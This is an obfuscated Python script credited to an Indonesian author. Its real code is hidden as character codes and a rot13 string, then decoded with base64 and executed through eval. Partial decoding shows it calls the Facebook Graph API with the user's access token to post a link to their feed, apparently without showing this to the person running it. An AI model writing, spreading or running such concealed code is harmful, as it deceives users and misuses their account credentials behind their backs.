#-------------------------------------------------
# Author    : Irpan Sopian 
# Donasi    : https://saweria.co/irpansopian
# Github    : https://www.github.com/IrpanQwerty-05
# Facebook  : https://www.facebook.com/irpan.qwerty
# -------------------------------------------------
import codecs,base64
htr = [97, 87, 49, 119, 98, 51, 74, 48, 73, 72, 74, 108, 99, 88, 86, 108, 99, 51, 82, 122, 76, 72, 74, 108, 76, 71, 112, 122, 98, 50, 52, 115, 99, 109, 70, 117, 90, 71, 57, 116, 76, 72, 78, 53, 99, 121, 120, 118, 99, 119, 48, 75, 90, 110, 74, 118, 98, 83, 66, 48, 97, 87, 49, 108, 73, 71, 108, 116, 99, 71, 57, 121, 100, 67, 66, 122, 98, 71, 86, 108, 99, 65, 48, 75, 90, 110, 74, 118, 98, 83, 66, 48, 97, 87, 49, 108, 73, 71, 108, 116, 99, 71, 57, 121, 100, 67, 66, 122, 98, 71, 86, 108, 99, 65, 48, 75, 90, 110, 74, 118, 98, 83, 66, 107, 89, 88, 82, 108, 100, 71, 108, 116, 90, 83, 66, 112, 98, 88, 66, 118, 99, 110, 81, 103, 90, 71, 70, 48, 90, 88, 82, 112, 98, 87, 85, 78, 67, 109, 108, 116, 99, 71, 57, 121, 100, 67, 66, 121, 89, 87, 53, 107, 98, 50, 48, 78, 67, 109, 90, 121, 98, 50, 48, 103, 90, 71, 70, 48, 90, 88, 82, 112, 98, 87, 85, 103, 97, 87, 49, 119, 98, 51, 74, 48, 73, 71, 82, 104, 100, 71, 85, 78, 67, 109, 108, 116, 99, 71, 57, 121, 100, 67, 66, 121, 90, 88, 70, 49, 90, 88, 78, 48, 99, 121, 119, 103, 98, 51, 77, 115, 73, 72, 78, 53, 99, 121, 119, 103, 99, 109, 85, 115, 73, 71, 112, 122, 98, 50, 52, 78, 67, 109, 90, 121, 98, 50, 48, 103, 100, 71, 104, 121, 90, 87, 70, 107, 97, 87, 53, 110, 73, 71, 108, 116, 99, 71, 57, 121, 100, 67, 66, 85, 97, 72, 74, 108, 89, 87, 81, 78, 67, 109, 108, 116, 99, 71, 57, 121, 100, 67, 66, 48, 97, 72, 74, 108, 89, 87, 82, 112, 98, 109, 99, 78, 67, 109, 108, 116, 99, 71, 57, 121, 100, 67, 66, 48, 97, 87, 49, 108, 68, 81, 112, 109, 99, 109, 57, 116, 73, 72, 74, 104, 98, 109, 82, 118, 98, 83, 66, 112, 98, 88, 66, 118, 99, 110, 81, 103, 89, 50, 104, 118, 97, 87, 78, 108, 76, 67, 66, 121, 89, 87, 53, 107, 97, 87, 53, 48, 76, 67, 66, 122, 97, 72, 86, 109, 90, 109, 120, 108, 68, 81, 112, 107, 90, 87, 89, 103, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 88, 100, 108, 99, 110, 82, 53, 88, 49, 57, 102, 88, 121, 104, 102, 88, 49, 57, 102, 97, 87, 108, 121, 99, 71, 70, 117, 99, 50, 57, 119, 97, 87, 70, 117, 98, 108, 57, 102, 88, 49, 56, 112, 79, 103, 48, 75, 73, 67, 65, 103, 73, 72, 66, 121, 97, 87, 53, 48, 75, 70, 57, 102, 88, 49, 57, 112, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 117, 88, 49, 57, 102, 88, 121, 107, 78, 67, 110, 78, 121, 73, 68, 48, 103, 73, 108, 119, 119, 77, 122, 78, 98, 77, 84, 115, 53, 78, 50, 51, 106, 103, 73, 53, 99, 77, 68, 77, 122, 87, 122, 65, 55, 77, 122, 78, 116, 55, 55, 121, 112, 55, 55, 121, 121, 55, 55, 121, 119, 55, 55, 121, 104, 55, 55, 121, 117, 88, 68, 65, 122, 77, 49, 115, 120, 79, 122, 107, 51, 98, 101, 79, 65, 106, 49, 119, 119, 77, 122, 78, 98, 77, 84, 115, 122, 77, 50, 48, 105, 68, 81, 112, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 106, 98, 50, 82, 108, 88, 49, 57, 102, 88, 122, 48, 105, 88, 68, 65, 122, 77, 49, 115, 120, 79, 122, 107, 51, 98, 101, 75, 85, 103, 108, 116, 99, 77, 68, 77, 122, 87, 122, 69, 55, 79, 84, 100, 116, 80, 67, 56, 43, 88, 68, 65, 122, 77, 49, 115, 120, 79, 122, 107, 51, 98, 86, 48, 103, 88, 68, 65, 122, 77, 49, 115, 120, 79, 122, 77, 122, 98, 83, 73, 78, 67, 109, 82, 108, 90, 105, 66, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 102, 88, 49, 57, 102, 75, 67, 107, 54, 68, 81, 111, 103, 73, 67, 66, 104, 80, 83, 65, 105, 88, 68, 65, 122, 77, 49, 115, 120, 79, 122, 107, 50, 98, 83, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 79, 43, 56, 113, 83, 68, 118, 118, 75, 122, 118, 118, 75, 47, 118, 118, 76, 98, 118, 118, 75, 85, 103, 55, 55, 121, 53, 55, 55, 121, 118, 55, 55, 121, 49, 73, 67, 68, 119, 110, 53, 105, 71, 73, 80, 67, 102, 109, 73, 89, 103, 56, 74, 43, 89, 104, 105, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 73, 113, 77, 81, 48, 75, 73, 67, 65, 103, 90, 109, 57, 121, 73, 71, 107, 103, 97, 87, 52, 103, 99, 109, 70, 117, 90, 50, 85, 111, 98, 71, 86, 117, 75, 71, 69, 112, 75, 84, 111, 78, 67, 105, 65, 103, 73, 67, 65, 103, 99, 51, 108, 122, 76, 110, 78, 48, 90, 71, 57, 49, 100, 67, 53, 51, 99, 109, 108, 48, 90, 83, 104, 104, 87, 50, 108, 100, 75, 81, 48, 75, 73, 67, 65, 103, 73, 67, 66, 122, 101, 88, 77, 117, 99, 51, 82, 107, 98, 51, 86, 48, 76, 109, 90, 115, 100, 88, 78, 111, 75, 67, 107, 78, 67, 105, 65, 103, 73, 67, 65, 103, 99, 50, 120, 108, 90, 88, 65, 111, 77, 67, 52, 120, 77, 68, 65, 112, 68, 81, 111, 103, 73, 67, 66, 119, 99, 109, 108, 117, 100, 67, 103, 112, 68, 81, 112, 107, 90, 87, 89, 103, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 50, 57, 119, 97, 87, 70, 117, 101, 71, 82, 102, 88, 49, 57, 102, 75, 71, 69, 112, 79, 103, 48, 75, 73, 67, 65, 103, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 88, 100, 108, 99, 110, 82, 53, 88, 49, 57, 102, 88, 121, 104, 122, 99, 105, 115, 105, 88, 68, 65, 122, 77, 49, 115, 120, 79, 122, 107, 121, 98, 102, 67, 102, 106, 76, 111, 103, 55, 55, 121, 122, 55, 55, 121, 111, 55, 55, 121, 104, 55, 55, 121, 121, 55, 55, 121, 108, 73, 80, 67, 102, 106, 76, 111, 103, 88, 68, 65, 122, 77, 49, 115, 119, 79, 122, 77, 122, 98, 83, 73, 114, 99, 51, 82, 121, 75, 71, 69, 112, 75, 81, 48, 75, 90, 71, 86, 109, 73, 70, 57, 102, 88, 49, 57, 112, 99, 110, 66, 104, 98, 109, 100, 104, 98, 110, 82, 108, 98, 109, 100, 102, 88, 49, 57, 102, 75, 70, 57, 102, 88, 49, 57, 112, 99, 110, 66, 104, 98, 110, 78, 118, 99, 71, 108, 104, 98, 110, 104, 50, 88, 49, 57, 102, 88, 121, 120, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 112, 90, 108, 57, 102, 88, 49, 56, 112, 79, 103, 48, 75, 73, 67, 65, 103, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 117, 73, 68, 48, 103, 101, 119, 48, 75, 73, 67, 65, 103, 73, 67, 65, 103, 74, 50, 70, 49, 100, 71, 104, 118, 99, 109, 108, 48, 101, 83, 99, 54, 74, 50, 100, 121, 89, 88, 66, 111, 76, 109, 90, 104, 89, 50, 86, 105, 98, 50, 57, 114, 76, 109, 78, 118, 98, 83, 99, 115, 68, 81, 111, 103, 73, 67, 65, 103, 73, 67, 65, 110, 89, 50, 70, 106, 97, 71, 85, 116, 89, 50, 57, 117, 100, 72, 74, 118, 98, 67, 99, 54, 74, 50, 49, 104, 101, 67, 49, 104, 90, 50, 85, 57, 77, 67, 99, 115, 68, 81, 111, 103, 73, 67, 65, 103, 73, 67, 65, 110, 99, 50, 86, 106, 76, 87, 78, 111, 76, 88, 86, 104, 76, 87, 49, 118, 89, 109, 108, 115, 90, 83, 99, 54, 74, 122, 56, 119, 74, 121, 119, 78, 67, 105, 65, 103, 73, 67, 65, 103, 73, 67, 100, 49, 99, 50, 86, 121, 76, 87, 70, 110, 90, 87, 53, 48, 74, 122, 111, 110, 84, 87, 57, 54, 97, 87, 120, 115, 89, 83, 56, 49, 76, 106, 65, 103, 75, 70, 103, 120, 77, 84, 115, 103, 84, 71, 108, 117, 100, 88, 103, 103, 101, 68, 103, 50, 88, 122, 89, 48, 75, 83, 66, 66, 99, 72, 66, 115, 90, 86, 100, 108, 89, 107, 116, 112, 100, 67, 56, 49, 77, 122, 99, 117, 77, 122, 89, 103, 75, 69, 116, 73, 86, 69, 49, 77, 76, 67, 66, 115, 97, 87, 116, 108, 73, 69, 100, 108, 89, 50, 116, 118, 75, 83, 66, 68, 97, 72, 74, 118, 98, 87, 85, 118, 79, 84, 103, 117, 77, 67, 52, 48, 78, 122, 85, 52, 76, 106, 89, 50, 73, 70, 78, 104, 90, 109, 70, 121, 97, 83, 56, 49, 77, 122, 99, 117, 77, 122, 89, 110, 102, 81, 48, 75, 73, 67, 65, 103, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 50, 57, 119, 97, 87, 70, 117, 99, 88, 100, 108, 99, 110, 82, 53, 101, 72, 108, 54, 88, 49, 57, 102, 88, 121, 65, 57, 73, 72, 74, 108, 99, 88, 86, 108, 99, 51, 82, 122, 76, 110, 66, 118, 99, 51, 81, 111, 90, 105, 74, 111, 100, 72, 82, 119, 99, 122, 111, 118, 76, 50, 100, 121, 89, 88, 66, 111, 76, 109, 90, 104, 89, 50, 86, 105, 98, 50, 57, 114, 76, 109, 78, 118, 98, 83, 57, 116, 90, 83, 57, 109, 90, 87, 86, 107, 80, 50, 120, 112, 98, 109, 115, 57, 73, 105, 116, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 112, 90, 108, 57, 102, 88, 49, 56, 114, 73, 105, 90, 119, 100, 87, 74, 115, 97, 88, 78, 111, 90, 87, 81, 57, 77, 67, 90, 104, 89, 50, 78, 108, 99, 51, 78, 102, 100, 71, 57, 114, 90, 87, 52, 57, 73, 105, 116, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 52, 100, 108, 57, 102, 88, 49, 56, 115, 97, 71, 86, 104, 90, 71, 86, 121, 99, 122, 49, 112, 99, 110, 66, 104, 98, 110, 78, 118, 99, 71, 108, 104, 98, 109, 52, 112, 76, 110, 82, 108, 101, 72, 81, 78, 67, 105, 65, 103, 73, 71, 108, 109, 73, 67, 100, 112, 90, 67, 99, 103, 97, 87, 52, 103, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 50, 57, 119, 97, 87, 70, 117, 99, 88, 100, 108, 99, 110, 82, 53, 101, 72, 108, 54, 88, 49, 57, 102, 88, 122, 111, 78, 67, 105, 65, 103, 73, 67, 65, 103, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 50, 57, 119, 97, 87, 70, 117, 97, 87, 82, 102, 88, 49, 57, 102, 73, 68, 48, 103, 97, 110, 78, 118, 98, 105, 53, 115, 98, 50, 70, 107, 99, 121, 104, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 120, 100, 50, 86, 121, 100, 72, 108, 52, 101, 88, 112, 102, 88, 49, 57, 102, 75, 86, 115, 110, 97, 87, 81, 110, 88, 81, 48, 75, 73, 67, 65, 103, 73, 67, 66, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 52, 90, 70, 57, 102, 88, 49, 56, 111, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 50, 57, 119, 97, 87, 70, 117, 97, 87, 82, 102, 88, 49, 57, 102, 75, 81, 48, 75, 73, 67, 65, 103, 90, 87, 120, 122, 90, 84, 111, 78, 67, 105, 65, 103, 73, 67, 65, 103, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 99, 88, 100, 108, 99, 110, 82, 53, 88, 49, 57, 102, 88, 121, 104, 102, 88, 49, 57, 102, 97, 88, 74, 119, 89, 87, 53, 122, 98, 51, 66, 112, 89, 87, 53, 120, 100, 50, 86, 121, 100, 72, 108, 52, 101, 88, 112, 102, 88, 49, 57, 102, 75, 81, 48, 75, 88, 49, 57, 102, 88, 50, 108, 121, 99, 71, 70, 117, 88, 49, 57, 102, 88, 121, 103, 112, 68, 81, 112, 107, 90, 87, 89, 103, 99, 109, 69, 111, 89, 83, 107, 54, 68, 81, 111, 103, 73, 67, 66, 109, 98, 51, 73, 103, 97, 83, 66, 112, 98, 105, 66, 121, 89, 87, 53, 110, 90, 83, 104, 115, 90, 87, 52, 111, 89, 83, 107, 112, 79, 103, 48, 75, 73, 67, 65, 103, 73, 67, 66, 122, 101, 88, 77, 117, 99, 51, 82, 107, 98, 51, 86, 48, 76, 110, 100, 121, 97, 88, 82, 108, 75, 71, 70, 98, 97, 86, 48, 112, 68, 81, 111, 103, 73, 67, 65, 103, 73, 72, 78, 53, 99, 121, 53, 122, 100, 71, 82, 118, 100, 88, 81, 117, 90, 109, 120, 49, 99, 50, 103, 111, 75, 81, 48, 75, 73, 67, 65, 103, 73, 67, 66, 122, 98, 71, 86, 108, 99, 67, 103, 119, 76, 106, 65, 119, 78, 83, 107, 78, 67, 105, 65, 103, 73, 72, 66, 121, 97, 87, 53, 48, 75, 67, 107, 78, 67, 109, 57, 122, 76, 110, 78, 53, 99, 51, 82, 108, 98, 83, 103, 110, 89, 50, 120, 108, 89, 88, 73, 110, 75, 81, 48, 75, 90, 71, 86, 109, 73, 71, 120, 118, 90, 50, 56, 111, 75, 84, 111, 78, 67, 105, 65, 103, 73, 67, 66, 115, 98, 50, 100, 118, 73, 68, 48, 103, 73, 105, 73, 105, 68, 81, 112, 99, 77, 68, 77, 122, 87, 122, 69, 55, 79, 84, 90, 116, 73, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 108, 43, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 108, 121, 68, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 90, 99, 103, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 88, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 88, 73, 67, 65, 103, 73, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 108, 121, 65, 103, 73, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 108, 43, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 108, 121, 65, 78, 67, 108, 119, 119, 77, 122, 78, 98, 77, 84, 115, 53, 78, 109, 48, 103, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 82, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 85, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 88, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 85, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 88, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 85, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 87, 100, 52, 112, 97, 73, 52, 112, 97, 73, 52, 112, 87, 85, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 87, 81, 52, 112, 87, 100, 73, 67, 65, 103, 73, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 107, 83, 65, 103, 73, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 107, 101, 75, 86, 109, 117, 75, 86, 107, 79, 75, 86, 107, 79, 75, 86, 107, 79, 75, 86, 107, 79, 75, 87, 105, 79, 75, 87, 105, 79, 75, 86, 108, 119, 48, 75, 88, 68, 65, 122, 77, 49, 115, 120, 79, 122, 107, 50, 98, 83, 68, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 90, 72, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 90, 84, 105, 108, 90, 51, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 90, 84, 105, 108, 90, 51, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108, 111, 106, 105, 108]		
tahmid = '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'		
pizza = '\x72\x6f\x74\x5f\x31\x33'		
mobile = codecs.decode(eval('\x74\x61\x68\x6d\x69\x64'), eval('\x70\x69\x7a\x7a\x61'))		
burger = base64.b64decode(''.join([chr(tech) for tech in htr])+eval('\x6d\x6f\x62\x69\x6c\x65'))		
eval(compile(eval("\x62\x75\x72\x67\x65\x72"),"<tahm1d>","exec"))		